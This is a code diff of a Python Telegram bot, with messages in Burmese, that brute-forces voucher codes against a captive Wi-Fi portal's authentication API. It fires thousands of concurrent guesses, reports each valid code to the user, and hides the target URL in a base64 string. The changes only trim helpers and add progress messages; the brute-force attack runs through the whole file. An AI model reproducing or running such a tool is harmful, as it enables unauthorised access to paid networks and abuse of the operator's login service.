@@ -18,23 +18,18 @@ _telegram_reply = bot.reply_to
 _telegram_edit = bot.edit_message_text
 user_data = {}
 scan_tasks = {}
-success_messages = {}
 success_texts = {}
-limited_messages = {}
 limited_texts = {}
-captcha_state = {}
 retry_counts = {}
 _session_pool = {}
 
 session = None
 _connector = None
 _voucher_sem = None
-_start_time = time.monotonic()
 
 SESSION_POOL_LIMIT = 60
 SESSION_POOL_SLOTS = 5
 CONCURRENCY = 2500
-BATCH_SIZE = 5000
 
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
@@ -47,7 +42,6 @@ async def web_server():
     port = int(os.environ.get('PORT', 8099))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"Web server started on port {port}")
 
 async def rebuild_session():
     global session, _connector
@@ -55,66 +49,24 @@ async def rebuild_session():
         await session.close()
     if _connector and not _connector.closed:
         await _connector.close()
-    timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
-    session = aiohttp.ClientSession(
-        timeout=timeout,
-        connector=_connector,
-        connector_owner=False
-    )
-
-TELEGRAM_MESSAGE_LIMIT = 3900
-TELEGRAM_RETRY_LIMIT = 3
-
-def split_telegram_message(text, max_chars=TELEGRAM_MESSAGE_LIMIT):
-    if len(text) <= max_chars:
-        return [text]
-    chunks = []
-    remaining = text
-    while remaining:
-        cut = min(max_chars, len(remaining))
-        if cut < len(remaining):
-            newline = remaining.rfind("\n", 0, cut)
-            if newline > 0:
-                cut = newline
-        chunks.append(remaining[:cut].rstrip())
-        remaining = remaining[cut:].lstrip()
-    return chunks
+    _connector = aiohttp.TCPConnector(limit=6000, ssl=False)
+    session = aiohttp.ClientSession(connector=_connector, connector_owner=False)
 
 async def safe_send_message(chat_id, text, **kwargs):
-    for attempt in range(TELEGRAM_RETRY_LIMIT):
+    for _ in range(3):
         try:
             return await _telegram_send(chat_id, text, **kwargs)
-        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
-            if attempt == TELEGRAM_RETRY_LIMIT - 1:
-                raise
-            await asyncio.sleep(1 + attempt)
-
-async def safe_reply_to(message, text, **kwargs):
-    for attempt in range(TELEGRAM_RETRY_LIMIT):
-        try:
-            return await _telegram_reply(message, text, **kwargs)
-        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
-            if attempt == TELEGRAM_RETRY_LIMIT - 1:
-                raise
-            await asyncio.sleep(1 + attempt)
+        except Exception:
+            await asyncio.sleep(1)
 
 async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
-    for attempt in range(TELEGRAM_RETRY_LIMIT):
+    for _ in range(3):
         try:
-            return await _telegram_edit(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=text,
-                **kwargs
-            )
-        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
-            if attempt == TELEGRAM_RETRY_LIMIT - 1:
-                raise
-            await asyncio.sleep(1 + attempt)
+            return await _telegram_edit(chat_id=chat_id, message_id=message_id, text=text, **kwargs)
+        except Exception:
+            await asyncio.sleep(1)
 
 bot.send_message = safe_send_message
-bot.reply_to = safe_reply_to
 bot.edit_message_text = safe_edit_message_text
 
 @bot.message_handler(commands=['start'])
@@ -140,18 +92,19 @@ async def start(message):
 async def callback_query(call):
     chat_id = call.message.chat.id
     data = call.data
+    try:
+        await bot.answer_callback_query(call.id)
+    except Exception:
+        pass
+
     if data == "btn_scan_help":
-        await bot.answer_callback_query(call.id, "💡 ညွှန်ကြားချက်: /input <url> ဖြင့် အရင်ချိတ်ပါ")
         await bot.send_message(chat_id, "📌 <b>အသုံးပြုပုံ</b>:\n၁။ <code>/input your_url</code> ဖြင့် Session URL ထည့်ပါ\n၂။ <code>/scan 6</code> (သို့) <code>/scan all</code> ဖြင့် စတင်ပါ", parse_mode="HTML")
     elif data == "btn_help":
-        await bot.answer_callback_query(call.id, "ℹ️ အကူအညီ မီနူး")
         await bot.send_message(chat_id, "📖 <b>Commands:</b>\n/input - URL ထည့်ရန်\n/scan - ကုဒ်စကန်ရန်\n/stop - ရပ်တန့်ရန်", parse_mode="HTML")
     elif data == "btn_status":
         active = "အလုပ်လုပ်နေသည် 🟢" if chat_id in scan_tasks else "ရပ်နားထားသည် 🔴"
-        await bot.answer_callback_query(call.id, f"📊 အခြေအနေ: {active}")
         await bot.send_message(chat_id, f"📊 <b>လက်ရှိ Bot အခြေအနေ:</b>\n• Status: {active}\n• Active Scans: {len(scan_tasks)}", parse_mode="HTML")
     elif data == "btn_stop":
-        await bot.answer_callback_query(call.id, "🛑 စကန်ဖတ်မှုကို ရပ်လိုက်ပါပြီ")
         data_task = scan_tasks.get(chat_id)
         if data_task and not data_task["task"].done():
             data_task["stop"] = True
@@ -162,12 +115,8 @@ async def callback_query(call):
             await bot.send_message(chat_id, "⚠️ လက်ရှိ စကန်ဖတ်နေခြင်း မရှိပါ။")
 
 async def check_session_url(session_url):
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    }
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
+        async with session.get(session_url, allow_redirects=True) as response:
             final_url = str(response.url)
             body = await response.text()
             return "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301)
@@ -264,15 +213,6 @@ def iter_codes(mode):
             yield all_generator(6)
     raise ValueError("Unsupported mode")
 
-def format_progress(checked, total=None, speed=0, found=0, retries=0):
-    speed_str = f"{speed:,.0f} codes/min"
-    if total is not None:
-        percent = (checked / total) * 100
-        filled = min(20, int(percent / 5))
-        bar = "█" * filled + "░" * (20 - filled)
-        return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}/{total:,}\n📊 Progress: {percent:.2f}%\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n[{bar}]"
-    return f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}\n⚡ Speed: {speed_str}\n✅ Found: {found}\n🔁 Retries: {retries}\n📊 Status: Running 🟢"
-
 async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
     try:
         code_iter = iter_codes(mode)
@@ -284,10 +224,29 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
     global _voucher_sem
     _voucher_sem = asyncio.Semaphore(CONCURRENCY)
     pending = set()
+    last_update = time.monotonic()
 
     async def _check(code):
         async with _voucher_sem:
-            return await perform_check(session_url, code, chat_id, scan_id, message=message)
+            return await perform_check(session_url, code, chat_id, message=message)
+
+    async def _flush_progress():
+        nonlocal last_update
+        now = time.monotonic()
+        if now - last_update < 2.0:
+            return
+        last_update = now
+        elapsed = now - scan_start
+        speed = (checked / elapsed * 60) if elapsed > 0 else 0
+        found = len(success_texts.get(chat_id, []))
+        retries = retry_counts.get(chat_id, 0)
+        percent = (checked / total) * 100 if total else 0
+        bar = ("█" * min(20, int(percent / 5))) + ("░" * (20 - min(20, int(percent / 5))))
+        text = f"🔍 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}" + (f"/{total:,}" if total else "") + f"\n⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found}\n" + (f"[{bar}]" if total else "")
+        try:
+            await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML")
+        except Exception:
+            pass
 
     try:
         for code in code_iter:
@@ -300,6 +259,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
             if len(pending) >= CONCURRENCY:
                 done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                 checked += len(done)
+                await _flush_progress()
         while pending:
             done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
             checked += len(done)
@@ -318,7 +278,7 @@ async def get_session_id(session, session_url, previous_session_id=None):
     except Exception:
         return previous_session_id
 
-async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
+async def perform_check(session_url, code, chat_id, message=None):
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
     response = None
     for _attempt in range(3):
@@ -344,7 +304,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
     if response and 'logonUrl' in response:
         if chat_id not in success_texts:
             success_texts[chat_id] = []
-        success_texts[chat_id].append(f"🎫 <code>{code}</code>")
+        success_texts[chat_id].append(code)
         if message:
             try:
                 await safe_send_message(message.chat.id, f"🎉 <b>Success Code Found!</b>\n\n🎫 Code: <code>{code}</code>", parse_mode="HTML")
@@ -357,7 +317,7 @@ async def start_polling():
     while True:
         try:
             await bot.infinity_polling(timeout=20, request_timeout=35)
-        except Exception as e:
+        except Exception:
             await asyncio.sleep(5)
 
 async def main():
